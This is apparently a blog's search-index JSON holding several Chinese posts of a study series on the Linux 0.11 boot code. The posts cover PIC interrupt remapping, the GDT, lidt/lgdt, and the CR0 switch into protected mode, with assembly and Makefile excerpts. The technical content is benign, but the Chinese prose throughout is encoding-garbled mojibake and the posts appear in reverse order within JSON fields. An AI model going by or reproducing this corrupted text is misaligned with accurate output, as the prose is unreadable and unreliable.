åœ¨ä¸Šé¢æ³¨é‡Šä¸Šçš„åŸè¯ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸å¿…åœ¨æ„ï¼Œåªè¦çŸ¥é“é‡æ–°ç¼–ç¨‹ä¹‹åï¼Œ8259 è¿™ä¸ªèŠ¯ç‰‡çš„å¼•è„šä¸ä¸­æ–­å·çš„å¯¹åº”å…³ç³»ï¼Œå˜æˆäº†å¦‚ä¸‹çš„æ ·å­å°±å¥½ã€‚ PICè¯·æ±‚å· ä¸­æ–­å· ç”¨é€” IRQ0 0x20 æ—¶é’Ÿä¸­æ–­ IRQ1 0x21 é”®ç›˜ä¸­æ–­ IRQ2 0x22 æ¥è¿ä»èŠ¯ç‰‡ IRQ3 0x23 ä¸²å£2 IRQ4 0x24 ä¸²å£1 IRQ5 0x25 å¹¶å£2 IRQ6 0x26 è½¯ç›˜é©±åŠ¨å™¨ IRQ7 0x27 å¹¶å£1 IRQ8 0x28 å®æ—¶é’Ÿä¸­æ–­ IRQ9 0x29 ä¿ç•™ IRQ10 0x2a ä¿ç•™ IRQ11 0x2b ä¿ç•™ IRQ12 0x2c é¼ æ ‡ä¸­æ–­ IRQ13 0x2d æ•°å­¦åå¤„ç†å™¨ IRQ14 0x2e ç¡¬ç›˜ä¸­æ–­ IRQ15 0x2f ä¿ç•™ å¥½äº†ï¼Œæ¥ä¸‹æ¥çš„ä¸€æ­¥ï¼Œå°±æ˜¯çœŸæ­£åˆ‡æ¢æ¨¡å¼çš„ä¸€æ­¥äº†ï¼Œä»ä»£ç ä¸Šçœ‹å°±ä¸¤è¡Œã€‚ mov ax,#0x0001 ; protected mode (PE) bit lmsw ax ; This is it; jmpi 0,8 ; jmp offset 0 of segment 8 (cs), execute system code å‰ä¸¤è¡Œï¼Œå°† cr0 è¿™ä¸ªå¯„å­˜å™¨çš„ä½ 0 ç½® 1ï¼Œæ¨¡å¼å°±ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼äº†ã€‚ æ‰€ä»¥çœŸæ­£çš„æ¨¡å¼åˆ‡æ¢ååˆ†ç®€å•ï¼Œé‡è¦çš„æ˜¯ä¹‹å‰åšçš„å‡†å¤‡å·¥ä½œã€‚ å†å¾€åï¼Œåˆæ˜¯ä¸€ä¸ªæ®µé—´è·³è½¬æŒ‡ä»¤ jmpiï¼Œåé¢çš„ 8 è¡¨ç¤º csï¼ˆä»£ç æ®µå¯„å­˜å™¨ï¼‰çš„å€¼ï¼Œ0 è¡¨ç¤ºåç§»åœ°å€ã€‚è¯·æ³¨æ„ï¼Œæ­¤æ—¶å·²ç»æ˜¯ä¿æŠ¤æ¨¡å¼äº†ï¼Œä¹‹å‰ä¹Ÿè¯´è¿‡ï¼Œä¿æŠ¤æ¨¡å¼ä¸‹å†…å­˜å¯»å€æ–¹å¼å˜äº†ï¼Œæ®µå¯„å­˜å™¨é‡Œçš„å€¼è¢«å½“åšæ®µé€‰æ‹©å­ã€‚ å›é¡¾ä¸‹æ®µé€‰æ‹©å­çš„æ¨¡æ ·ã€‚ 8 ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºå°±æ˜¯ 00000,0000,0000,1000 , å¯¹ç…§ä¸Šé¢æ®µé€‰æ‹©å­çš„ç»“æ„ï¼Œå¯ä»¥çŸ¥é“æè¿°ç¬¦ç´¢å¼•å€¼æ˜¯ 1ï¼Œä¹Ÿå°±æ˜¯è¦å»å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆgdtï¼‰ä¸­æ‰¾ç¬¬ä¸€é¡¹æ®µæè¿°ç¬¦ã€‚ è¿˜è®°å¾—ä¸Šä¸€è®²ä¸­çš„å…¨å±€æè¿°ç¬¦çš„å…·ä½“å†…å®¹ä¹ˆï¼Ÿ gdt: .word 0,0,0,0 ; dummy.word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9A00 ; code read/exec .word 0x00C0 ; granularity=4096, 386 .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9200 ; data read/write .word 0x00C0 ; granularity=4096, 386 æˆ‘ä»¬è¯´äº†ï¼Œç¬¬ 0 é¡¹æ˜¯ç©ºå€¼ï¼Œç¬¬ä¸€é¡¹è¢«è¡¨ç¤ºä¸ºä»£ç æ®µæè¿°ç¬¦ï¼Œæ˜¯ä¸ªå¯è¯»å¯æ‰§è¡Œçš„æ®µï¼Œç¬¬äºŒé¡¹ä¸ºæ•°æ®æ®µæè¿°ç¬¦ï¼Œæ˜¯ä¸ªå¯è¯»å¯å†™æ®µï¼Œä¸è¿‡ä»–ä»¬çš„æ®µåŸºå€éƒ½æ˜¯ 0ã€‚ æ‰€ä»¥ï¼Œè¿™é‡Œå–çš„å°±æ˜¯è¿™ä¸ªä»£ç æ®µæè¿°ç¬¦ï¼Œæ®µåŸºå€æ˜¯ 0ï¼Œåç§»ä¹Ÿæ˜¯ 0ï¼Œé‚£åŠ ä¸€å—å°±è¿˜æ˜¯ 0 å’¯ï¼Œæ‰€ä»¥æœ€ç»ˆè¿™ä¸ªè·³è½¬æŒ‡ä»¤ï¼Œå°±æ˜¯è·³è½¬åˆ°å†…å­˜åœ°å€çš„ 0 åœ°å€å¤„ï¼Œå¼€å§‹æ‰§è¡Œã€‚ é›¶åœ°å€å¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿˜æ˜¯å›é¡¾ä¹‹å‰çš„å†…å­˜å¸ƒå±€å›¾ã€‚ å°±æ˜¯æ“ä½œç³»ç»Ÿå…¨éƒ¨ä»£ç çš„ system è¿™ä¸ªå¤§æ¨¡å—ï¼Œsystem æ¨¡å—æ€ä¹ˆç”Ÿæˆçš„å‘¢ï¼Ÿç”± Makefile æ–‡ä»¶å¯çŸ¥ï¼Œæ˜¯ç”± head.s å’Œ main.c ä»¥åŠå…¶ä½™å„æ¨¡å—çš„æ“ä½œç³»ç»Ÿä»£ç åˆå¹¶æ¥çš„ï¼Œå¯ä»¥ç†è§£ä¸ºæ“ä½œç³»ç»Ÿçš„å…¨éƒ¨æ ¸å¿ƒä»£ç ç¼–è¯‘åçš„ç»“æœã€‚ tools/system: boot/head.o init/main.o \\ $(ARCHIVES) $(DRIVERS) $(MATH) $(LIBS) $(LD) $(LDFLAGS) boot/head.o init/main.o \\ $(ARCHIVES) \\ $(DRIVERS) \\ $(MATH) \\ $(LIBS) \\ -o tools/system \u003e System.map æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±è¦é‡ç‚¹é˜…è¯» head.s äº†ã€‚ è¿™ä¹Ÿæ˜¯ boot æ–‡ä»¶å¤¹ä¸‹çš„æœ€åä¸€ä¸ªç”±æ±‡ç¼–å†™å°±çš„æºä»£ç æ–‡ä»¶ï¼Œå“å‘€ï¼Œä¸çŸ¥ä¸è§‰å°±æŠŠä¸¤ä¸ªæ“ä½œç³»ç»Ÿæºç æ–‡ä»¶ï¼ˆbootsect.s å’Œ setup.sï¼‰è®²å®Œäº†ï¼Œè€Œä¸”æ˜¯æ±‡ç¼–å†™çš„ä»¤äººå¤´ç–¼çš„ä»£ç ã€‚ head.s è¿™ä¸ªæ–‡ä»¶ä»…ä»…æ˜¯ä¸ºäº†é¡ºåˆ©è¿›å…¥ç”±åé¢çš„ c è¯­è¨€å†™å°±çš„ main.c åšçš„å‡†å¤‡ï¼Œæ‰€ä»¥å’¬å’¬ç‰™çœ‹å®Œè¿™ä¸ªä¹‹åï¼Œæˆ‘ä»¬å°±ç»ˆäºå¯ä»¥è¿›å…¥ c è¯­è¨€çš„ä¸–ç•Œäº†ï¼ä¹Ÿç»ˆäºå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ main å‡½æ•°äº†ï¼ åœ¨é‚£é‡Œï¼Œæ“ä½œç³»ç»ŸçœŸæ­£ç§€æ“ä½œçš„åœ°æ–¹ï¼Œæ‰åˆšåˆšå¼€å§‹ï¼æ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ â€”â€”- æœ¬å›æ‰©å±•èµ„æ–™ â€”â€”- ä¿æŠ¤æ¨¡å¼ä¸‹é€»è¾‘åœ°å€åˆ°çº¿æ€§åœ°å€ï¼ˆä¸å¼€å¯åˆ†é¡µæ—¶å°±æ˜¯ç‰©ç†åœ°å€ï¼‰çš„è½¬åŒ–ï¼Œçœ‹ Intel æ‰‹å†Œï¼š Volume 3 Chapter 3.4 Logical And Linear Addresses æ®µæè¿°ç¬¦ç»“æ„å’Œè¯¦ç»†è¯´æ˜ï¼Œçœ‹ Intel æ‰‹å†Œï¼š Volume 3 Chapter 3.4.5 Segment Descriptors å¯¹æ“ä½œç³»ç»Ÿå¦‚ä½•ç¼–è¯‘çš„ï¼Œæ¯”å¦‚å¥½å¥‡é‚£ä¸ª system æ˜¯æ€ä¹ˆæ¥çš„ï¼Œå¯ä»¥å°è¯•ç†è§£ä¸€ä¸‹ Linux 0.11 æºç ä¸­çš„ Makefileï¼Œ","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬å…­å› å…­è¡Œä»£ç å°±è¿›å…¥äº†ä¿æŠ¤æ¨¡å¼ ","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬ä¸‰ç¯‡","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"Linux-0.11-03 æœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬ä¸‰ç¯‡ã€‚ ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"06 å…ˆè§£å†³æ®µå¯„å­˜å™¨çš„å†å²åŒ…è¢±é—®é¢˜ ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼Œæ“ä½œç³»ç»ŸåˆæŠ˜è…¾äº†ä¸€ä¸‹å†…å­˜ï¼Œä¹‹åçš„å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…å­˜å¸ƒå±€å°±ä¸ä¼šå˜äº†ï¼Œç»ˆäºç¨³å®šä¸‹æ¥äº†ï¼Œç›®å‰å†…éƒ¨å½¢å¼å¦‚ä¸‹ã€‚ 0 åœ°å€å¼€å§‹å¤„å­˜æ”¾ç€æ“ä½œç³»ç»Ÿçš„å…¨éƒ¨ä»£ç ï¼Œä¹Ÿå°±æ˜¯ system æ¨¡å—ï¼Œ0x90000 ä½ç½®å¤„å¾€åçš„å‡ åä¸ªå­—èŠ‚å­˜æ”¾ç€ä¸€äº›è®¾å¤‡çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿ä»¥åä½¿ç”¨ã€‚ å†…å­˜åœ°å€ é•¿åº¦(å­—èŠ‚) åç§° 0x90000 2 å…‰æ ‡ä½ç½® 0x90002 2 æ‰©å±•å†…å­˜æ•° 0x90004 2 æ˜¾ç¤ºé¡µé¢ 0x90006 1 æ˜¾ç¤ºæ¨¡å¼ 0x90007 1 å­—ç¬¦åˆ—æ•° 0x90008 2 æœªçŸ¥ 0x9000A 1 æ˜¾ç¤ºå†…å­˜ 0x9000B 1 æ˜¾ç¤ºçŠ¶æ€ 0x9000C 2 æ˜¾å¡ç‰¹æ€§å‚æ•° 0x9000E 1 å±å¹•è¡Œæ•° 0x9000F 1 å±å¹•åˆ—æ•° 0x90080 16 ç¡¬ç›˜1å‚æ•°è¡¨ 0x90090 16 ç¡¬ç›˜2å‚æ•°è¡¨ 0x901FC 2 æ ¹è®¾å¤‡å· è¿™é‡Œçš„å†…å­˜å¸ƒå±€ååˆ†æ¸…æ™°ï¼Œä¸»è¦æ˜¯æ–¹ä¾¿åç»­æ“ä½œç³»ç»Ÿçš„å¤§æ˜¾èº«æ‰‹ã€‚æ¥ä¸‹æ¥å°±è¦æ¨¡å¼çš„è½¬æ¢ï¼Œéœ€è¦ä»ç°åœ¨çš„ 16 ä½çš„å®æ¨¡å¼è½¬å˜ä¸ºä¹‹å 32 ä½çš„ä¿æŠ¤æ¨¡å¼ã€‚ ä»ä¸šåŠ¡æ¥è®²ï¼Œè¿™æœ¬åº”æ˜¯æ¯”è¾ƒå¤æ‚çš„ä¸€éƒ¨åˆ†å†…å®¹ï¼Œéš¾åº¦è¾ƒé«˜ï¼Œä½†ä»ä»£ç é‡çœ‹ï¼Œå´æ˜¯å°‘å¾—å¯æ€œã€‚ ä» 16 ä½çš„å®æ¨¡å¼åˆ° 32 ä½ä¿æŠ¤æ¨¡å¼çš„è½¬æ¢æ˜¯ x86 çš„å†å²åŒ…è¢±é—®é¢˜ï¼Œç°åœ¨çš„ CPU å‡ ä¹éƒ½æ˜¯æ”¯æŒ 32 ä½æ¨¡å¼ç”šè‡³ 64 ä½æ¨¡å¼äº†ï¼Œå¾ˆå°‘æœ‰è¿˜ä»…ä»…åœç•™åœ¨ 16 ä½çš„å®æ¨¡å¼ä¸‹çš„ CPUã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä¸ºäº†è¿™ä¸ªå†å²åŒ…è¢±ï¼Œå†™ä¸€æ®µæ¨¡å¼è½¬æ¢çš„ä»£ç ï¼Œå¦‚æœ Intel CPU è¢«é‡æ–°è®¾è®¡è€Œä¸ç”¨è€ƒè™‘å…¼å®¹æ€§ï¼Œé‚£ä¹ˆä»Šå¤©çš„ä»£ç å°†ä¼šå‡å°‘å¾ˆå¤šç”šè‡³ä¸å¤å­˜åœ¨ã€‚ è¿™é‡Œä»ç„¶æ˜¯ setup.s æ–‡ä»¶ä¸­çš„ä»£ç : lidt idt_48 ; load idt with 0,0 lgdt gdt_48 ; load gdt with whatever appropriate idt_48: .word 0 ; idt limit=0 .word 0,0 ; idt base=0L è¦ç†è§£è¿™ä¸¤æ¡æŒ‡ä»¤ï¼Œå°±æ¶‰åŠåˆ°å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼çš„ç¬¬ä¸€ä¸ªåŒºåˆ«ã€‚æˆ‘ä»¬ç°åœ¨è¿˜å¤„äºå®æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªæ¨¡å¼çš„ CPU è®¡ç®—ç‰©ç†åœ°å€çš„æ–¹å¼è¿˜è®°å¾—ä¹ˆï¼Ÿä¸è®°å¾—çš„è¯çœ‹ä¸€ä¸‹ ç¬¬ä¸€å› æœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç ã€‚ å°±æ˜¯æ®µåŸºå€å·¦ç§»å››ä½ï¼Œå†åŠ ä¸Šåç§»åœ°å€ã€‚æ¯”å¦‚ï¼š å½“ CPU åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼åï¼ŒåŒæ ·çš„ä»£ç ï¼Œå†…å­˜åœ°å€çš„è®¡ç®—æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ã€‚åˆšåˆš ds å¯„å­˜å™¨é‡Œå­˜å‚¨çš„å€¼ï¼Œåœ¨å®æ¨¡å¼ä¸‹å«åšæ®µåŸºå€ï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å«æ®µé€‰æ‹©å­ã€‚æ®µé€‰æ‹©å­é‡Œå­˜å‚¨ç€æ®µæè¿°ç¬¦çš„ç´¢å¼•ã€‚ é€šè¿‡æ®µæè¿°ç¬¦ç´¢å¼•ï¼Œå¯ä»¥ä»å…¨å±€æè¿°ç¬¦è¡¨ gdt ä¸­æ‰¾åˆ°ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œæ®µæè¿°ç¬¦é‡Œå­˜å‚¨ç€æ®µåŸºå€ã€‚ æ®µåŸºå€å–å‡ºæ¥ï¼Œå†å’Œåç§»åœ°å€ç›¸åŠ ï¼Œå°±å¾—åˆ°äº†ç‰©ç†åœ°å€ï¼Œæ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ã€‚ æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œæ®µå¯„å­˜å™¨ï¼ˆæ¯”å¦‚ dsã€ssã€csï¼‰é‡Œå­˜å‚¨çš„æ˜¯æ®µé€‰æ‹©å­ï¼Œæ®µé€‰æ‹©å­å»å…¨å±€æè¿°ç¬¦è¡¨ä¸­å¯»æ‰¾æ®µæè¿°ç¬¦ï¼Œä»ä¸­å–å‡ºæ®µåŸºå€ã€‚ å¥½äº†ï¼Œå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆgdtï¼‰é•¿ä»€ä¹ˆæ ·ï¼Ÿå®ƒåœ¨å“ªï¼Ÿæ€ä¹ˆè®© CPU çŸ¥é“å®ƒåœ¨å“ªï¼Ÿ å…ˆè¯´è¯´å®ƒåœ¨å“ªï¼Ÿåœ¨å†…å­˜ä¸­å‘—ï¼Œé‚£ä¹ˆæ€ä¹ˆå‘Šè¯‰ CPU å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆgdtï¼‰åœ¨å†…å­˜ä¸­çš„ä»€ä¹ˆä½ç½®å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç”±æ“ä½œç³»ç»ŸæŠŠè¿™ä¸ªä½ç½®ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ªå« gdtr çš„å¯„å­˜å™¨ä¸­ã€‚ æ€ä¹ˆå­˜å‘¢ï¼Ÿå°±æ˜¯åˆšåˆšé‚£æ¡æŒ‡ä»¤ã€‚ lgdt gdt_48 å…¶ä¸­ lgdt å°±è¡¨ç¤ºæŠŠåé¢çš„å€¼ï¼ˆgdt_48ï¼‰æ”¾åœ¨ gdtr å¯„å­˜å™¨ä¸­ï¼Œgdt_48 æ ‡ç­¾ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒé•¿ä»€ä¹ˆæ ·ã€‚ gdt_48: .word 0x800 ; gdt limit=2048, 256 GDT entries .word 512+gdt,0x9 ; gdt base = 0X9xxxx å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ ‡ç­¾ä½ç½®å¤„è¡¨ç¤ºä¸€ä¸ª 48 ä½çš„æ•°æ®ï¼Œå…¶ä¸­é«˜ 32 ä½å­˜å‚¨ç€çš„æ­£æ˜¯å…¨å±€æè¿°ç¬¦è¡¨ gdt çš„å†…å­˜åœ°å€ 0x90200 + gdtã€‚ gdt æ˜¯ä¸ªæ ‡ç­¾ï¼Œè¡¨ç¤ºåœ¨æœ¬æ–‡ä»¶å†…çš„åç§»é‡ï¼Œè€Œæœ¬æ–‡ä»¶æ˜¯ setup.sï¼Œç¼–è¯‘åæ˜¯æ”¾åœ¨ 0x90200 è¿™ä¸ªå†…å­˜åœ°å€çš„ï¼Œæ‰€ä»¥è¦åŠ ä¸Š 0x90200 è¿™ä¸ªå€¼ã€‚ é‚£ gdt è¿™ä¸ªæ ‡ç­¾å¤„ï¼Œå°±æ˜¯å…¨å±€æè¿°ç¬¦è¡¨åœ¨å†…å­˜ä¸­çš„çœŸæ­£æ•°æ®äº†ã€‚ gdt: .word 0,0,0,0 ; dummy .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9A00 ; code read/exec .word 0x00C0 ; granularity=4096, 386 .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9200 ; data read/write .word 0x00C0 ; granularity=4096, 386 æ ¹æ®åˆšåˆšçš„æ®µæè¿°ç¬¦æ ¼å¼ã€‚ å¯ä»¥çœ‹å‡ºç›®å‰å…¨å±€æè¿°ç¬¦è¡¨æœ‰ä¸‰ä¸ªæ®µæè¿°ç¬¦ï¼Œç¬¬ä¸€ä¸ªä¸ºç©ºï¼Œç¬¬äºŒä¸ªæ˜¯ä»£ç æ®µæè¿°ç¬¦ï¼ˆtype=codeï¼‰ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ•°æ®æ®µæè¿°ç¬¦ï¼ˆtype=dataï¼‰ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ®µæè¿°ç¬¦çš„æ®µåŸºå€éƒ½æ˜¯ 0ï¼Œä¹Ÿå°±æ˜¯ä¹‹ååœ¨é€»è¾‘åœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„æ—¶å€™ï¼Œé€šè¿‡æ®µé€‰æ‹©å­æŸ¥æ‰¾åˆ°æ— è®ºæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µï¼Œå–å‡ºçš„æ®µåŸºå€éƒ½æ˜¯ 0ï¼Œé‚£ä¹ˆç‰©ç†åœ°å€å°†ç›´æ¥ç­‰äºç¨‹åºå‘˜ç»™å‡ºçš„é€»è¾‘åœ°å€ï¼ˆå‡†ç¡®è¯´æ˜¯é€»è¾‘åœ°å€ä¸­çš„åç§»åœ°å€ï¼‰ã€‚ å…·ä½“æ®µæè¿°ç¬¦çš„ç»†èŠ‚è¿˜æœ‰å¾ˆå¤šï¼Œå°±ä¸å±•å¼€äº†ï¼Œæ¯”å¦‚è¿™é‡Œçš„é«˜ 22 ä½å°±è¡¨ç¤ºå®ƒæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ç›®å‰çš„å†…å­˜å¸ƒå±€ï¼Œè¿˜æ˜¯åˆ«ç®¡æ¯”ä¾‹ã€‚ è¿™é‡Œæˆ‘æŠŠ idtr å¯„å­˜å™¨ä¹Ÿç”»å‡ºæ¥äº†ï¼Œè¿™ä¸ªæ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨ï¼Œå…¶åŸç†å’Œå…¨å±€æè¿°ç¬¦è¡¨ä¸€æ ·ã€‚å…¨å±€æè¿°ç¬¦è¡¨æ˜¯è®©æ®µé€‰æ‹©å­å»é‡Œé¢å¯»æ‰¾æ®µæè¿°ç¬¦ç”¨çš„ï¼Œè€Œä¸­æ–­æè¿°ç¬¦è¡¨æ˜¯ç”¨æ¥åœ¨å‘ç”Ÿä¸­æ–­æ—¶ï¼ŒCPU æ‹¿ç€ä¸­æ–­å·å»ä¸­æ–­æè¿°ç¬¦è¡¨ä¸­å¯»æ‰¾ä¸­æ–­å¤„ç†ç¨‹åºçš„åœ°å€ï¼Œæ‰¾åˆ°åå°±è·³åˆ°ç›¸åº”çš„ä¸­æ–­ç¨‹åºä¸­å»æ‰§è¡Œï¼Œå…·ä½“æˆ‘ä»¬åé¢é‡åˆ°äº†å†è¯´ã€‚ å¥½äº†ï¼Œä»Šå¤©æˆ‘ä»¬å°±è®²ï¼Œæ“ä½œç³»ç»Ÿè®¾ç½®äº†ä¸ªå…¨å±€æè¿°ç¬¦è¡¨ gdtï¼Œä¸ºåé¢åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼åï¼Œèƒ½å»é‚£é‡Œå¯»æ‰¾åˆ°æ®µæè¿°ç¬¦ï¼Œç„¶åæ‹¼å‡‘æˆæœ€ç»ˆçš„ç‰©ç†åœ°å€ï¼Œå°±è¿™ä¸ªä½œç”¨ã€‚å½“ç„¶ï¼Œè¿˜æœ‰å¾ˆå¤šæ®µæè¿°ç¬¦ï¼Œä½œç”¨ä¸ä»…ä»…æ˜¯è½¬æ¢æˆæœ€ç»ˆçš„ç‰©ç†åœ°å€ï¼Œä¸è¿‡è¿™æ˜¯åè¯äº†ã€‚ è¿™ä»…ä»…æ˜¯è¿›å…¥ä¿æŠ¤æ¨¡å¼å‰å‡†å¤‡å·¥ä½œçš„å…¶ä¸­ä¸€ä¸ªï¼Œåé¢çš„è·¯è¿˜é•¿ç€å‘¢ã€‚æ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ â€”â€”- æœ¬å›æ‰©å±•èµ„æ–™ â€”â€”- ä¿æŠ¤æ¨¡å¼ä¸‹é€»è¾‘åœ°å€åˆ°çº¿æ€§åœ°å€ï¼ˆä¸å¼€å¯åˆ†é¡µæ—¶å°±æ˜¯ç‰©ç†åœ°å€ï¼‰çš„è½¬åŒ–ï¼Œçœ‹ Intel æ‰‹å†Œï¼š Volume 3 Chapter 3.4 Logical And Linear Addresses æ®µæè¿°ç¬¦ç»“æ„å’Œè¯¦ç»†è¯´æ˜ï¼Œçœ‹ Intel æ‰‹å†Œï¼š Volume 3 Chapter 3.4.5 Segment Descriptors æ¯”å¦‚æ–‡ä¸­è¯´çš„æ•°æ®æ®µä¸ä»£ç æ®µçš„åˆ’åˆ†ï¼Œå…¶å®è¿˜æœ‰æ›´ç»†åˆ†çš„æƒé™æ§åˆ¶ã€‚ ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬å…­å› å…ˆè§£å†³æ®µå¯„å­˜å™¨çš„å†å²åŒ…è¢±é—®é¢˜ ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬äºŒç¯‡","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"Linux-0.11-02 æœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬äºŒç¯‡ã€‚ ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"03 åšå¥½æœ€æœ€åŸºç¡€çš„å‡†å¤‡å·¥ä½œ ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼Œæ“ä½œç³»ç»Ÿçš„ä»£ç æœ€å¼€å¤´çš„ 512 å­—èŠ‚çš„æ•°æ®ï¼Œä»ç¡¬ç›˜çš„å¯åŠ¨åŒºå…ˆæ˜¯è¢«ç§»åŠ¨åˆ°äº†å†…å­˜ 0x7c00 å¤„ï¼Œç„¶ååˆç«‹åˆ»è¢«ç§»åŠ¨åˆ° 0x90000 å¤„ï¼Œå¹¶ä¸”è·³è½¬åˆ°æ­¤å¤„å¾€åå†ç¨ç¨åç§» go è¿™ä¸ªæ ‡ç­¾æ‰€ä»£è¡¨çš„åç§»åœ°å€å¤„ã€‚ é‚£æˆ‘ä»¬æ¥ä¸‹æ¥ï¼Œå°±ç»§ç»­æŠŠæˆ‘ä»¬çš„ç›®å…‰æ”¾åœ¨ go è¿™ä¸ªæ ‡ç­¾çš„ä½ç½®ï¼Œè·Ÿç€ CPU çš„æ­¥ä¼å¾€åçœ‹ã€‚ go: mov ax,cs mov ds,ax mov es,ax mov ss,ax mov sp,#0xFF00 å…¨éƒ½æ˜¯ mov æ“ä½œï¼Œé‚£å¥½åŠäº†ã€‚ è¿™æ®µä»£ç çš„ç›´æ¥æ„æ€å¾ˆå®¹æ˜“ç†è§£ï¼Œå°±æ˜¯æŠŠ cs å¯„å­˜å™¨çš„å€¼åˆ†åˆ«å¤åˆ¶ç»™ dsã€es å’Œ ss å¯„å­˜å™¨ï¼Œç„¶ååˆæŠŠ 0xFF00 ç»™äº† sp å¯„å­˜å™¨ã€‚ å›é¡¾ä¸‹ CPU å¯„å­˜å™¨å›¾ã€‚ cs å¯„å­˜å™¨è¡¨ç¤ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒCPU å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä»£ç åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œå°±æ˜¯ç”± cs:ip è¿™ç»„å¯„å­˜å™¨é…åˆæŒ‡å‘çš„ï¼Œå…¶ä¸­ cs æ˜¯åŸºå€ï¼Œip æ˜¯åç§»åœ°å€ã€‚ ç”±äºä¹‹å‰æ‰§è¡Œè¿‡ä¸€ä¸ªæ®µé—´è·³è½¬æŒ‡ä»¤ï¼Œè¿˜è®°å¾—ä¸ï¼Ÿ jmpi go,0x9000 æ‰€ä»¥ç°åœ¨ cs å¯„å­˜å™¨é‡Œçš„å€¼å°±æ˜¯ 0x9000ï¼Œip å¯„å­˜å™¨é‡Œçš„å€¼æ˜¯ go è¿™ä¸ªæ ‡ç­¾çš„åç§»åœ°å€ã€‚é‚£è¿™ä¸‰ä¸ª mov æŒ‡ä»¤å°±åˆ†åˆ«ç»™ dsã€es å’Œ ss å¯„å­˜å™¨èµ‹å€¼ä¸ºäº† 0x9000ã€‚ ds 